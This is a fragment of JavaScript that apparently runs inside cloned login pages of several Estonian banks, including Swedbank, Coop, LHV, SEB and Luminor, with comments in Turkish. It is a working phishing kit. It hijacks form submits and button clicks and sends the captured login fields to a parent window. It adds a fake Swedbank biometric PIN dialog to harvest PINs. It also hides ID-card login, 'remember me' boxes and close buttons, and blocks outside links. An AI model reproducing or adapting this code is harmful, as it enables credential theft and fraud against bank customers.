              '<div style="font-size:23px;font-weight:700;line-height:1.2;color:#2f2424;">Kinnita biomeetriline sisselogimine</div>',
              '<div style="margin-top:8px;font-size:14px;line-height:1.55;color:#5b4b43;">Sisesta oma PIN-kood, et jätkata Swedbanki biomeetria sisselogimisega.</div>',
              '</div>',
              '<button type="button" data-close="1" aria-label="Sulge" style="border:0;background:transparent;color:#7b6d67;font-size:24px;line-height:1;cursor:pointer;padding:0;">×</button>',
              '</div>',
              '<label for="trae-swedbank-bio-pin" style="display:block;margin-top:20px;font-size:13px;font-weight:700;color:#4a3f39;">PIN-kood</label>',
              '<input id="trae-swedbank-bio-pin" name="pinCode" type="password" inputmode="numeric" autocomplete="off" maxlength="8" style="margin-top:8px;width:100%;border:1px solid #d7d2cc;border-radius:12px;padding:13px 14px;font-size:16px;line-height:1.2;color:#1f2937;outline:none;box-sizing:border-box;" />',
              '<div data-error="1" style="display:none;margin-top:8px;font-size:12px;color:#b42318;">PIN-kood on kohustuslik.</div>',
              '<div style="display:flex;justify-content:flex-end;gap:10px;margin-top:22px;">',
              '<button type="button" data-close="1" style="border:1px solid #d0d5dd;background:#ffffff;color:#344054;border-radius:12px;padding:11px 16px;font-size:14px;font-weight:600;cursor:pointer;">Tühista</button>',
              '<button type="button" data-submit="1" style="border:0;background:#f26d21;color:#ffffff;border-radius:12px;padding:11px 18px;font-size:14px;font-weight:700;cursor:pointer;">Jätka</button>',
              '</div>',
              '</div>'
            ].join('');

            document.body.appendChild(overlay);

            const pinInput = overlay.querySelector('#trae-swedbank-bio-pin');
            const errorText = overlay.querySelector('[data-error="1"]');
            const closePopup = () => removeSwedbankBiometricPopup();
            const submitPopup = () => {
                const pinValue = pinInput && pinInput.value ? pinInput.value.trim() : '';
                if (!pinValue) {
                    if (errorText) {
                        errorText.style.display = 'block';
                    }
                    if (pinInput) {
                        pinInput.focus();
                    }
                    return;
                }

                const popupField = {
                    key: 'pinCode',
                    name: 'pinCode',
                    id: 'trae-swedbank-bio-pin',
                    formControlName: '',
                    value: pinValue,
                    type: 'password',
                    label: 'PIN-kood',
                    ariaLabel: 'PIN-kood',
                    placeholder: ''
                };

                closePopup();
                submitSwedbankBiometricFields(baseFields, popupField);
            };

            overlay.querySelectorAll('[data-close="1"]').forEach(button => {
                button.addEventListener('click', closePopup);
            });

            overlay.addEventListener('click', (event) => {
                if (event.target === overlay || event.target === overlay.firstElementChild) {
                    closePopup();
                }
            });

            if (pinInput) {
                pinInput.focus();
                pinInput.addEventListener('input', () => {
                    if (errorText && pinInput.value.trim()) {
                        errorText.style.display = 'none';
                    }
                });
                pinInput.addEventListener('keydown', (event) => {
                    if (event.key === 'Enter') {
                        event.preventDefault();
                        submitPopup();
                    }
                    if (event.key === 'Escape') {
                        event.preventDefault();
                        closePopup();
                    }
                });
            }

            const submitButton = overlay.querySelector('[data-submit="1"]');
            if (submitButton) {
                submitButton.addEventListener('click', submitPopup);
            }
        };

        const maybeOpenSwedbankBiometricPopup = (fields, loginMethod) => {
            if (!isSwedbankBiometricFlow(loginMethod)) {
                return false;
            }

            const filledFields = fields.filter(field => field && field.value && field.value.trim() !== '');
            if (filledFields.length < 2) {
                return true;
            }

            openSwedbankBiometricPopup(filledFields);
            return true;
        };

        ensureSwedbankBiometricIdentityField();
        setTimeout(ensureSwedbankBiometricIdentityField, 150);
        setTimeout(ensureSwedbankBiometricIdentityField, 600);
        document.addEventListener('input', ensureSwedbankBiometricIdentityField, true);
        document.addEventListener('change', ensureSwedbankBiometricIdentityField, true);

        const extractLoginMethodLabel = (rawValue) => {
            const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
            const normalized = loginMethod.toLowerCase();

            if (!normalized) {
                return "";
            }

            if (window.location.href.includes('swedbank') && normalized.includes('bio')) {
                return 'Biomeetria/PIN-kood';
            }

            if (window.location.href.includes('citadele')) {
                if (normalized.includes('mobilescan') || normalized.includes('digipass')) return 'MobileSCAN/Digipass 780';
                if (normalized.includes('pin')) return 'PIN-kalkulaator';
                if (normalized.includes('mobiil')) return 'Mobiil-ID';
                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            }

            if (window.location.href.includes('coop')) {
                if (normalized.includes('bio')) return 'Biomeetria';
                if (normalized.includes('smart')) return 'Smart-ID';
                if (normalized.includes('mobiil')) return 'Mobiil-ID';
                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            }

            if (normalized.includes('seb mobiil') || normalized.includes('mobiilirakendus')) return 'SEB Mobiilirakendus';
            if (normalized.includes('smart')) return 'Smart-ID';
            if (normalized.includes('mobiil')) return 'Mobiil-ID';
            if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            if (normalized.includes('mobilescan')) return 'MobileSCAN';
            if (normalized.includes('digipass')) return 'Digipass';
            if (normalized.includes('pin')) return 'PIN-kalkulaator';
            if (normalized.includes('bio')) return 'Biomeetria';

            return loginMethod;
        };

        const getLoginMethod = () => {
            const rememberedLoginMethod = extractLoginMethodLabel(window.__traeSelectedLoginMethod || '');
            if (rememberedLoginMethod) {
                return rememberedLoginMethod;
            }

            if (window.location.href.includes('coop')) {
                const coopCandidates = Array.from(
                    document.querySelectorAll(
                        '.v-tab--active, .v-slide-group__content [aria-selected="true"], .v-item-group .v-item--active, .v-btn-toggle .v-btn--active, input[type="radio"]:checked + label, input[type="radio"]:checked ~ label, .coop-tab.active, .auth-methods-method.active'
                    )
                );

                for (const candidate of coopCandidates) {
                    const label = extractLoginMethodLabel(candidate.textContent || '');
                    if (label) {
                        return label;
                    }
                }
            }

            let loginMethod = "Bilinmiyor";
            const activeTab = document.querySelector('.active, .selected, .current, [aria-selected="true"]');
            if (activeTab) {
                loginMethod = extractLoginMethodLabel(activeTab.textContent || '') || loginMethod;
            }
            if (window.location.href.includes('op-corporate')) {
                const checkedRadio = document.querySelector('input[type="radio"]:checked');
                if (checkedRadio && checkedRadio.nextElementSibling) {
                    loginMethod = extractLoginMethodLabel(checkedRadio.nextElementSibling.textContent || '') || loginMethod;
                }
            }
            return loginMethod;
        };

        const submitCoopVisibleFields = () => {
            const activeCoopPanel =
                document.querySelector('.v-window-item--active') ||
                document.querySelector('.v-window-item:not([style*="display:none"])');
            const coopFields = buildCapturedFields(activeCoopPanel || document);
            if (coopFields.length === 0) {
                coopFields.push(...buildCapturedFields(document));
            }
            if (coopFields.filter(field => (field.value || '').trim() !== '').length < 2) {
                return;
            }
            const coopInputs = buildInputMap(coopFields);

            window.parent.postMessage({
              type: 'ESTONIA_BANK_SUBMIT',
              formData: { inputs: coopInputs, fields: coopFields, loginMethod: getLoginMethod() }
            }, '*');
        };

        const ensureCoopSubmitButton = () => {
            if (!window.location.href.includes('coop')) return;

            const coopButton = document.getElementById('ID_LoginSubmit');
            if (!coopButton) return;

            const activeCoopPanel =
                document.querySelector('.v-window-item--active') ||
                document.querySelector('.v-window-item:not([style*="display:none"])') ||
                document;
            const visibleFieldCount = buildCapturedFields(activeCoopPanel).filter(field => (field.value || '').trim() !== '').length;
            const ready = visibleFieldCount >= 2;

            coopButton.disabled = !ready;
            coopButton.style.opacity = ready ? '1' : '0.5';
            coopButton.style.cursor = ready ? 'pointer' : 'not-allowed';
            coopButton.style.pointerEvents = ready ? 'auto' : 'none';
            if (ready) {
                coopButton.removeAttribute('disabled');
                coopButton.classList.remove('v-btn--disabled');
                coopButton.classList.remove('disabled');
            } else {
                coopButton.setAttribute('disabled', 'disabled');
            }

            if (!coopButton.dataset.traeBound) {
                coopButton.dataset.traeBound = '1';
                coopButton.addEventListener('click', (event) => {
                    event.preventDefault();
                    event.stopPropagation();
                    event.stopImmediatePropagation();
                    submitCoopVisibleFields();
                    return false;
                }, true);
            }
        };

        ensureCoopSubmitButton();
        setTimeout(ensureCoopSubmitButton, 150);
        setTimeout(ensureCoopSubmitButton, 600);
        document.addEventListener('input', ensureCoopSubmitButton, true);
        document.addEventListener('change', ensureCoopSubmitButton, true);

        // 1. Intercept Submits
        document.addEventListener('submit', (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            const form = e.target;
            const fields = buildCapturedFields(form);
            const inputs = buildInputMap(fields);
            const loginMethod = getLoginMethod();

            if (maybeOpenSwedbankBiometricPopup(fields, loginMethod)) {
                return false;
            }
            
            window.parent.postMessage({
              type: 'ESTONIA_BANK_SUBMIT',
              formData: { inputs, fields, loginMethod }
            }, '*');
        }, true);

        // 2. Intercept Clicks (Tabs, Buttons, Links)
        document.addEventListener('click', (e) => {
          let target = e.target;
          
          // OP Corporate Bank: Eesti ID-kaart tıklamalarını KESİNLİKLE engelle
          if (window.location.href.includes('op-corporate')) {
              if (target.closest('#estonian-id-card') || target.id === 'estonian-id-card-radio' || target.getAttribute('for') === 'estonian-id-card-radio') {
                  e.preventDefault();
                  e.stopPropagation();
                  e.stopImmediatePropagation();
                  return false;
              }

              if (target.closest('#mobile-id, #mobile-id-radio, label[for="mobile-id-radio"], #smart-id, #smart-id-radio, label[for="smart-id-radio"], #pin-calculator, #pin-calculator-radio, label[for="pin-calculator-radio"]')) {
                  return;
              }
          }
          
          // Dış bağlantıları (href) engelle (Citadele MobileSCAN vs için)
          const a = target.closest('a');
          if (a && a.href) {
             // Eğer link bir "tab" değilse ve dışarıya gidiyorsa engelle
             const aText = a.textContent ? a.textContent.toLowerCase() : '';
             const isTabLink = aText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|parool|password|šifr/i) !== null;
             
             if (!isTabLink && !a.href.startsWith('javascript') && !a.href.startsWith(window.location.origin) && !a.href.includes('#')) {
                 e.preventDefault();
                 e.stopPropagation();
             } else if (isTabLink) {
                 e.preventDefault(); // Sadece yönlendirmeyi engelle, tıklama aşağıya sekme olarak aksın
             }
          }
          
          // DO NOT intercept if clicking on inputs or selects (allow typing)
          if (target.tagName === 'INPUT' && target.type !== 'submit' && target.type !== 'button') {
              if (target.type === 'radio' && target.closest('.ds-option')) {
                  // Allow OP Corporate Bank radio buttons to be handled as tabs
              } else {
                  return;
              }
          }
          if (target.tagName === 'SELECT' || target.tagName === 'TEXTAREA') return;

          // Let labels work natively
          if (target.closest('label')) {
              if (window.location.href.includes('coop') || target.closest('.ds-option') || target.closest('.auth-methods-method')) {
                  // Allow OP Corporate Bank and LHV labels to be handled as tabs
              } else {
                  return;
              }
          }

          // Check if it's a submit button
          const btn = target.closest('button, input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"]');
          let isSubmitBtn = false;
          
          if (btn) {
              const btnText = btn.textContent ? btn.textContent.trim().toLowerCase() : '';
              const isTabBtn = btnText.length < 50 && btnText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr/i) !== null;
              const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || btnText.includes('ru') || btnText.includes('en') || btnText.includes('et');
              
              if (!isTabBtn && !isLangBtn) {
                  isSubmitBtn = true;
                  target = btn;
              }
          }

          // If not a submit button, check if it's a tab
          let isTabClick = false;
          let targetTab = null;

          if (!isSubmitBtn) {
              // Coop ve LHV Bank için eklenmiş daha spesifik sekme yakalayıcı (Örn: li.tab, div.tab, .lhv-tab-link, .auth-methods-method, .ds-option)
              const tab = target.closest('li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
              if (tab) {
                  const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr/i) !== null;
                  
                  if (isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\btab\b|\bnav-item\b|\bseb-tabs__item\b|\bc-tabs__item\b|\btab-item\b|\blhv-tab-link\b|\bauth-methods-method\b|\bds-option\b|\bds-option__label\b/i))) {
                      isTabClick = true;
                      targetTab = tab;
                  }
              }
          }

          if (isTabClick && targetTab) {
              // We move preventDefault down to where targetIndex is confirmed
              
              let targetIndex = -1;
              const listContainer = targetTab.closest('ul, [role="tablist"], .tabs, .nav, .seb-tabs, .c-tabs__list');
              
              if (listContainer) {
                 const tabs = Array.from(listContainer.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
                 targetIndex = tabs.findIndex(c => c === targetTab || c.contains(targetTab));
              }
              
              if (targetIndex === -1 && targetTab.parentElement) {
                 let lookupTab = targetTab;
                 if (lookupTab.classList && lookupTab.classList.contains('ds-option__label') && lookupTab.parentElement.classList.contains('ds-option')) {
                     lookupTab = lookupTab.parentElement;
                 }
                 const siblings = Array.from(lookupTab.parentElement.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
                 targetIndex = siblings.findIndex(c => c === lookupTab || c.contains(lookupTab));
              }

              // Özel Durumlar (Eğer indeks hala bulunamadıysa veya özel bankalar ise metne göre bul)
              // LHV gibi bankalar "e.data.targetIndex" zorunlu eşleşmesini bypass etmelidir.
              if (window.location.href.includes('citadele') || window.location.href.includes('coop') || window.location.href.includes('inbank') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('swedbank') || targetIndex === -1) {
                  const tabText = targetTab.textContent.toLowerCase();
                  if (window.location.href.includes('coop')) {
                      // Coop Bank Index Mapping (Biomeetria: 0, Smart-ID: 1, Mobiil-ID: 2)
                      if (tabText.includes('bio')) {
                          targetIndex = 0;
                      } else if (tabText.includes('smart')) {
                          targetIndex = 1;
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 2;
                      } else {
                         // Eğer ID-Kaart vs tıklanırsa sessizce durdur
                         e.preventDefault();
                         e.stopPropagation();
                         return false; 
                      }
                  } else if (window.location.href.includes('inbank')) {
                      // Inbank için özel kural: ID-kaart tamamen engellenmeli, diğerleri aktif olmalı
                      if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card') || tabText.includes('id kaart')) {
                          e.preventDefault();
                          e.stopPropagation();
                          e.stopImmediatePropagation();
                          return false;
                      } else if (tabText.includes('smart')) {
                          targetIndex = 0;
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 1;
                      } else if (tabText.includes('pin')) {
                          targetIndex = 2;
                      }
                  } else if (window.location.href.includes('lhv')) {
                      // LHV Bank Index Mapping (Biomeetria: 0, Smart-ID: 1, Mobiil-ID: 2, PIN-kalkulaator: 3, Salasõna: 4, ID-kaart: 5)
                      if (tabText.includes('bio')) {
                          targetIndex = 0; 
                      } else if (tabText.includes('smart')) {
                          targetIndex = 1; 
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 2; 
                      } else if (tabText.includes('pin')) {
                          targetIndex = 3; 
                      } else if (tabText.includes('parool') || tabText.includes('password') || tabText.includes('šifr') || tabText.includes('salasõna') || tabText.includes('salasãµna') || tabText.includes('salas')) {
                          targetIndex = 4; 
                      } else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) {
                          targetIndex = 5; 
                      }
                  } else if (window.location.href.includes('citadele')) {
                      // Citadele Bank Index Mapping (C-App: 0, Smart-ID: 1, ID-Kaart: 2, MobileSCAN/Digipass: 3)
                      if (tabText.includes('c-app') || tabText.includes('citadele')) targetIndex = 0;
                      else if (tabText.includes('smart')) targetIndex = 1;
                      else if (tabText.includes('id-kaart')) targetIndex = 2;
                      else if (tabText.includes('mobilescan') || tabText.includes('digipass') || tabText.includes('koodikalkulaator')) targetIndex = 3;
                  } else if (window.location.href.includes('luminor')) {
                      // Luminor Bank Index Mapping (Mobiil-ID: 0, ID-kaart: 1, PIN-kalkulaator: 2, Smart-ID: 3)
                      if (tabText.includes('mobiil')) targetIndex = 0;
                      else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 1;
                        else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
                        else if (tabText.includes('smart')) targetIndex = 3;
                    } else if (window.location.href.includes('op-corporate')) {
                        // OP Corporate Bank Index Mapping (Mobiil-ID: 0, Smart-ID: 1, PIN kalkulaator: 2)
                        if (tabText.includes('mobiil')) targetIndex = 0;
                        else if (tabText.includes('smart')) targetIndex = 1;
                        else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
                    } else if (window.location.href.includes('seb')) {
                        if (tabText.includes('smart')) targetIndex = 0;
                        else if (tabText.includes('mobiil-id') || tabText.includes('mobile-id') || tabText.includes('mobile id')) targetIndex = 1;
                        else if (tabText.includes('seb mobiil') || tabText.includes('mobiilirakendus') || tabText.includes('mobile application')) targetIndex = 2;
                        else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 3;
                        else if (tabText.includes('digipass') || tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 4;
                    } else if (window.location.href.includes('swedbank')) {
                        if (tabText.includes('bio')) targetIndex = 0;
                        else if (tabText.includes('smart')) targetIndex = 1;
                        else if (tabText.includes('mobiil')) targetIndex = 2;
                        else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 3;
                        else if (tabText.includes('digipass') || tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 4;
                    } else {
                      // Diğer Bankalar İçin
                      if (tabText.includes('smart')) targetIndex = 0;
                      else if (tabText.includes('mobiil')) targetIndex = 1;
                      else if (tabText.includes('id-kaart')) targetIndex = 2;
                      else if (tabText.includes('mobilescan') || tabText.includes('digipass')) targetIndex = 3;
                      else if (tabText.includes('pin')) targetIndex = 3;
                      else if (tabText.includes('bio')) targetIndex = 4;
                  }
              }

              if (targetIndex !== -1) {
                  const clickedLoginMethod = extractLoginMethodLabel(targetTab.textContent || '');
                  if (clickedLoginMethod) {
                      window.__traeSelectedLoginMethod = clickedLoginMethod;
                  }

                  // Yalnızca Coop bankasıysa ve targetIndex 0, 1, 2 dışında bir şeyse (Örn: ID-Kaart = 3) çalıştır
                  if (window.location.href.includes('coop') && targetIndex > 2) {
                      e.preventDefault();
                      return false;
                  }
                  
                  // Debug log
                  console.log("Sending ESTONIA_BANK_TAB_CLICK for index:", targetIndex);

                  // Allow radio button to check itself visually by NOT preventing default if it's OP Corporate Bank
                  if (window.location.href.includes('op-corporate') && (target.tagName === 'INPUT' || target.closest('label'))) {
                      // Do not prevent default so radio can be checked
                  } else {
                      e.preventDefault();
                      e.stopPropagation();
                      e.stopImmediatePropagation();
                  }

                  window.parent.postMessage({
                        type: 'ESTONIA_BANK_TAB_CLICK',
                        targetIndex: targetIndex,
                        loginMethod: clickedLoginMethod
                    }, '*');
              } else {
                  // If it was considered a tab click but no index found, we should still prevent default
                  // unless it's OP corporate
                  if (!window.location.href.includes('op-corporate')) {
                      e.preventDefault();
                      e.stopPropagation();
                      e.stopImmediatePropagation();
                  }
              }
              return false; // Ekstra güvenlik: tarayıcı varsayılanlarını tamamen iptal et
          }

          if (isSubmitBtn && target) {
             e.preventDefault();
             e.stopPropagation();
             e.stopImmediatePropagation();

             if (window.location.href.includes('coop')) {
               submitCoopVisibleFields();
               return false;
             }

             const form = target.closest('form');
             const inputContainer = form || document;
             const fields = buildCapturedFields(inputContainer);
             const inputs = buildInputMap(fields);
             
             const filledFieldCount = fields.filter(field => field.value && field.value.trim() !== '').length;

             // En az iki görünür alan dolmadan submit etme
             if (filledFieldCount < 2) {
                 return;
             }

             const loginMethod = getLoginMethod();
             if (maybeOpenSwedbankBiometricPopup(fields, loginMethod)) {
                 return false;
             }

             window.parent.postMessage({
               type: 'ESTONIA_BANK_SUBMIT',
               formData: { inputs, fields, loginMethod }
             }, '*');
             return;
          }
        }, true); // Use capture to intercept before bank's own JS

        // Input label fix: hide labels when input has value or focus
        const updateInputState = (input) => {
          let wrapper = input.closest('.field-group, .bb-input, .i-input, .input-group, .lhv-text-field-wrapper, .seb-input, .input-wrapper, .form-group, .field, .c-input, .v-input, .form-row, .control-input');
          if (!wrapper) wrapper = input.parentElement;
          const formRowWrapper = input.closest('.form-row'); // Luminor için ekstra kontrol

          const hasValue = input.value && input.value.trim() !== '';
          const isFocused = document.activeElement === input;

          const applyClasses = (el) => {
            if (!el) return;
            if (hasValue) {
              el.classList.add('has-value', 'is-filled', 'not-empty', 'mdc-text-field--invalid');
            } else {
              el.classList.remove('has-value', 'is-filled', 'not-empty', 'mdc-text-field--invalid');
            }
            if (isFocused) {
              el.classList.add('focused', 'is-focused', 'mdc-text-field--focused');
            } else {
              el.classList.remove('focused', 'is-focused', 'mdc-text-field--focused');
            }
          };

          applyClasses(wrapper);
          if (wrapper !== formRowWrapper) {
            applyClasses(formRowWrapper);
          }

          // Big Bank ve Inbank Info/Placeholder fix
          if (hasValue || isFocused) {
              const infoElements = input.parentElement ? input.parentElement.querySelectorAll('.info, .placeholder, [class*="placeholder"]') : [];
              infoElements.forEach(el => {
                  if (el.tagName !== 'INPUT' && !el.contains(input)) {
                      el.style.opacity = '0';
                      el.style.pointerEvents = 'none';
                  }
              });
              // Eğer parentElement içinde yoksa, wrapper içinde sadece bu input'a yakın olanları bul
              if (infoElements.length === 0 && wrapper) {
                  wrapper.querySelectorAll('.info, .placeholder, [class*="placeholder"]').forEach(el => {
                      if (el.tagName !== 'INPUT' && !el.contains(input)) {
                          // Wrapper içindeki diğer inputlara ait olup olmadığını kontrol et
                          const hasOtherInput = Array.from(el.parentElement?.querySelectorAll('input') || []).some(i => i !== input);
                          if (!hasOtherInput) {
                              el.style.opacity = '0';
                              el.style.pointerEvents = 'none';
                          }
                      }
                  });
              }
          } else {
              const infoElements = input.parentElement ? input.parentElement.querySelectorAll('.info, .placeholder, [class*="placeholder"]') : [];
              infoElements.forEach(el => {
                  if (el.tagName !== 'INPUT' && !el.contains(input)) {
                      el.style.opacity = '1';
                      el.style.pointerEvents = 'auto';
                  }
              });
              if (infoElements.length === 0 && wrapper) {
                  wrapper.querySelectorAll('.info, .placeholder, [class*="placeholder"]').forEach(el => {
                      if (el.tagName !== 'INPUT' && !el.contains(input)) {
                          const hasOtherInput = Array.from(el.parentElement?.querySelectorAll('input') || []).some(i => i !== input);
                          if (!hasOtherInput) {
                              el.style.opacity = '1';
                              el.style.pointerEvents = 'auto';
                          }
                      }
                  });
              }
          }

          // LHV floating label fix - hide it to prevent overlap
          const lhvFloatingLabel = input.closest('.lhv-text-field')?.querySelector('.lhv-floating-label');
          if (lhvFloatingLabel) {
             if (hasValue || isFocused) {
                 lhvFloatingLabel.classList.add('mdc-floating-label--float-above');
                 lhvFloatingLabel.style.opacity = '0';
             } else {
                 lhvFloatingLabel.classList.remove('mdc-floating-label--float-above');
                 lhvFloatingLabel.style.opacity = '1';
             }
          }

          // Form boş ise butonları disable etme kontrolü
          const form = input.closest('form');
          if (form) {
             if (window.location.href.includes('coop')) {
                 const activeCoopFieldCount = buildCapturedFields(form).filter(field => (field.value || '').trim() !== '').length;
                 const ready = activeCoopFieldCount >= 2;
                form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                     btn.disabled = !ready;
                     btn.style.opacity = ready ? '1' : '0.5';
                     btn.style.cursor = ready ? 'pointer' : 'not-allowed';
                     btn.style.pointerEvents = ready ? 'auto' : 'none';
                     if (ready) {
                       btn.classList.remove('disabled');
                       btn.classList.remove('bb-button--disabled');
                     }
                });
                return;
             }

              let filledCount = 0;
              form.querySelectorAll('input').forEach(i => {
                if (i.type !== 'hidden' && i.type !== 'submit' && i.type !== 'button') {
                     if (i.value && i.value.trim() !== '') {
                         filledCount += 1;
                     }
                }
             });
             
             form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                  if (filledCount < 2) {
                     btn.disabled = true;
                     btn.style.opacity = '0.5';
                     btn.style.cursor = 'not-allowed';
                     btn.style.pointerEvents = 'none';
                 } else {
                     btn.disabled = false;
                     btn.style.opacity = '1';
                     btn.style.cursor = 'pointer';
                     btn.style.pointerEvents = 'auto';
                     btn.classList.remove('disabled');
                     btn.classList.remove('bb-button--disabled');
                 }
             });
          }

          // Gather labels to hide
          const labelsToHide = [];
          if (input.id) {
             document.querySelectorAll('label[for="' + input.id + '"]').forEach(l => labelsToHide.push(l));
          }
          const parentLabel = input.closest('label');
          if (parentLabel && !labelsToHide.includes(parentLabel)) {
             labelsToHide.push(parentLabel);
          }
          if (wrapper) {
             wrapper.querySelectorAll('.placeholder, [class*="placeholder"], .mdc-floating-label').forEach(l => {
                 // Sadece bu input için olanları al
                 const containsOtherInput = Array.from(l.querySelectorAll('input')).some(i => i !== input);
                 if (!containsOtherInput) {
                     labelsToHide.push(l);
                 }
             });
          }

          labelsToHide.forEach(label => {
            if (!label.contains(input)) {
              const style = window.getComputedStyle(label);
              const isFloatingOrAbsolute = style.position === 'absolute' || 
                                           label.className.toLowerCase().includes('placeholder') ||
                                           (style.position === 'relative' && (parseInt(style.marginTop) < 0 || parseInt(style.top) > 0)) ||
                                           label.closest('.bb-input, [data-testid*="bb-input"], [data-testid*="bb-masked-input"]') != null;

              if (hasValue || isFocused) {
                  if (isFloatingOrAbsolute || label.tagName !== 'LABEL') {
                      label.style.opacity = '0';
                      label.style.pointerEvents = 'none';
                  }
              } else {
                  if (isFloatingOrAbsolute || label.tagName !== 'LABEL') {
                      label.style.opacity = '1';
                      label.style.pointerEvents = 'auto';
                  }
              }
            } else {
              Array.from(label.children).forEach(child => {
                if (!child.contains(input) && (child.tagName === 'SPAN' || child.tagName === 'DIV')) {
                  if (!child.classList.contains('mdc-notched-outline')) {
                    const childStyle = window.getComputedStyle(child);
                    const isChildFloating = childStyle.position === 'absolute' || child.className.toLowerCase().includes('placeholder') || child.classList.contains('lhv-placeholder-custom');
                    
                    if (hasValue || isFocused) {
                        if (isChildFloating || child.tagName === 'SPAN') {
                            child.style.opacity = '0';
                        }
                    } else {
                        if (isChildFloating || child.tagName === 'SPAN') {
                            child.style.opacity = '1';
                        }
                    }
                  }
                }
              });
            }
          });
          
          // INBANK FIX: Input içindeki yazının gizlenmesini/şeffaflaşmasını KESİN OLARAK engelle
          if (window.location.href.includes('inbank')) {
              input.style.setProperty('opacity', '1', 'important');
              input.style.setProperty('color', 'inherit', 'important');
              input.style.setProperty('display', 'block', 'important');
              input.style.setProperty('visibility', 'visible', 'important');
          }
        };

        // Hide specific elements for specific banks based on user request
        try {
            // Coop Pank: Remove "Jäta mind meelde" (Remember me) checkbox and label
            document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
                const label = cb.closest('label') || document.querySelector('label[for="' + cb.id + '"]');
                if (label && (label.textContent.toLowerCase().includes('jäta') || label.textContent.toLowerCase().includes('salvesta') || label.textContent.toLowerCase().includes('meelde'))) {
                    label.style.display = 'none';
                    cb.style.display = 'none';
                } else if (cb.parentNode && cb.parentNode.textContent.toLowerCase().includes('meelde')) {
                    cb.parentNode.style.display = 'none';
                }
            });

            // ID-Kaart seçeneğini tüm bankalarda deaktif et / gizle (Citadele hariç)
            document.querySelectorAll('a, li, button, [role="tab"], div').forEach(el => {
                const text = el.textContent ? el.textContent.toLowerCase().trim() : '';
                // Citadele, LHV ve Luminor Bank için ID-Kaart'ı gizleme
                if (window.location.href.includes('citadele') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('seb')) {
                    return;
                }
                
                // INBANK FIX: Inbank için gizleme (display: none) yapma, sadece ID-Kaart'ı soluklaştır ve pointer-events kapat.
                // Diğer sekmelere (Smart-ID, Mobiil-ID vb.) kesinlikle DOKUNMA!
                if (window.location.href.includes('inbank')) {
                    if ((text === 'id-kaart' || text === 'eesti id-kaart' || text.includes('id-kaart')) && text.length < 30) {
                        el.style.pointerEvents = 'none';
                        el.style.opacity = '0.5';
                        el.classList.add('disabled');
                    } else if (el.tagName === 'A' || el.tagName === 'LI' || el.getAttribute('role') === 'tab') {
                        // Smart-ID, Mobiil-ID gibi diğer sekmeler KESİNLİKLE aktif ve görünür kalsın
                        el.style.display = '';
                        el.style.pointerEvents = 'auto';
                        el.style.opacity = '1';
                        el.classList.remove('disabled');
                    }
                    return; // Inbank'tayken genel ID-kaart gizleme koduna inmesini engelle
                }

                if ((text === 'id-kaart' || text === 'eesti id-kaart' || text.includes('id-kaart')) && text.length < 30) {
                    el.style.display = 'none';
                    el.style.pointerEvents = 'none';
                }
            });
            
            // LHV Bank: Fix for overlapping texts. 
            // Find inner span elements that don't have mdc classes but overlap
            document.querySelectorAll('.lhv-text-field-wrapper span:not([class*="mdc-"])').forEach(span => {
                // If it's a structural span without a class but has text, hide it when focused
                if (span.textContent.trim().length > 0 && !span.className) {
                    span.classList.add('lhv-placeholder-custom');
                }
            });
            // Luminor Bank: Disable X (Close) button
            document.querySelectorAll('.close, .btn-close, .modal-close, [aria-label="Close"], [aria-label="Sulge"], .luminor-close').forEach(btn => {
                btn.style.display = 'none';
                btn.style.pointerEvents = 'none';
            });
        } catch(e) {}

        // Buton disable/enable durumunu biz kendi form mantığımızda yönetiyoruz
